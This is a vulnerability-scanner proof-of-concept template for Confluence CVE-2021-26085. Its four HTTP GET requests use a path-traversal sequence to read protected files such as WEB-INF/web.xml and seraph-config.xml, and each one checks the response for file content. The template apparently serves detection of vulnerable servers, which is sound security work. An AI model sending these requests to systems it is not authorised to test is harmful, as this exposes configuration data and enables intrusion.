name: poc-yaml-confluence-cve-2021-26085
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /s/123cfx/_/;/WEB-INF/web.xml
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
    r1:
        request:
            cache: true
            method: GET
            path: /s/123cfx/_/;/WEB-INF/classes/seraph-config.xml
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"<seraph-paths.xml>")
    r2:
        request:
            cache: true
            method: GET
            path: /s/123cfx/_/;/META-INF/maven/com.atlassian.confluence/confluence-webapp/pom.properties
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"<groupId>")
    r3:
        request:
            cache: true
            method: GET
            path: /s/123cfx/_/;/META-INF/maven/com.atlassian.confluence/confluence-webapp/pom.xml
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"<groupId>com.atlassian.confluence</groupId>")
expression: r0() || r1() || r2() || r3()
detail:
    author: L0ading(https://www.cnblogs.com/L0ading/)
    links:
        - https://jira.atlassian.com/browse/CONFSERVER-67893
        